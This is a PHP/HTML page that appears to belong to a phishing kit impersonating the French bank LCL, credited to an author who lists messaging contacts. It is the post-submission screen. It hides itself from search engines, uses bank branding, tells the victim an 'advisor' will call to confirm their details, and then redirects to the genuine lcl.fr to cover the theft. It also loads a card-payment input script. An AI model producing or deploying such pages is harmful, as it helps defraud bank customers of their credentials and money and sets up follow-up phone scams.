<?php

/**
 * @link              https://www.z0n51.com/
 * @since             19/11/2020
 * @package           LCL
 * @facebook          https://www.facebook.com/z0n51
 * @whatsapp          +212601728021
 * @icq               @z0n51
 * @telegram          @z0n51
 *
 * Project Name:      LCL
 * Author:            z0n51
 * Author URI:        https://www.facebook.com/z0n51
 */

    include_once '../inc/app.php';
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" href="../assets/images/favicon.ico" type="image/x-icon"> 
        
        <title>LCL</title>
    </head>

    <body>
        
        <!-- HEADER -->
        <header id="header">
            <img style="min-width: 960px;" src="../assets/images/log-header.png">
            <div class="top"></div>
            <div class="middle"></div>
            <div class="bottom"></div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main">
            <div class="containerr">
                <div class="title text-center">
                    <img src="../assets/images/sus.gif">
                    <h3 style="font-size: 20px; margin: 10px 0">Votre Demande a été transmise.</h3>
                    <p>N'oubliez pas que l'un de nous conseiller technique vous contactera<br>pour confirmer vos informations à fin de finaliser votre demande.<br>Vous êtes redirigé pour vous reconnecter automatiquement aprés quelques seconds. </p>
                </div>
            </div>
        </main>
        <!-- END MAIN -->

        <!-- FOOTER -->
        <footer id="footer">
            <img style="min-width: 911px;" src="../assets/images/log-footer.png">
            <div class="top"></div>
            <div class="bottom"></div>
        </footer>
        <!-- END FOOTER -->

        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/jquery.payment.js"></script>
        <script src="../assets/js/main.js"></script>

        <script type="text/javascript">
            var dispatch = '<?php echo $dispatch; ?>';
            setTimeout(function () {
                window.location.href= 'https://www.lcl.fr/';
            },7000); // 1000 = 1s
        </script>

    </body>

</html>